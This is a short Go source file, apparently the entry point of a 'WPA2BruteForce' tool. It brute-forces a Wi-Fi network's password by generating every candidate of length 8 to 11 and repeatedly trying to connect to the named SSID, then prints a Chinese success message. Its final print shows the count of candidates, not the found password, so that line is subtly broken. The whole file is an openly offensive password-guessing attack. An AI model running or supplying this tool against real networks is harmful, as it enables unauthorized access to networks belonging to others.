package main

import (
	"WPA2BruteForce/connect"
	"WPA2BruteForce/generate"
	"fmt"
	"os"
)

func main() {
	ssid := os.Args[1]
	var password []string
	for i := 8; i < 12; i++ {
		generate.GenerateCombinations("", i, &password)
		for _, v := range password {
			err := connect.Linux(ssid, v)
			if err != nil {
				continue
			} else {
				goto DONE
			}
		}
	}
DONE:
	fmt.Printf("找到密码:%d\t密码只显示一次请及时记录\n", len(password))
}
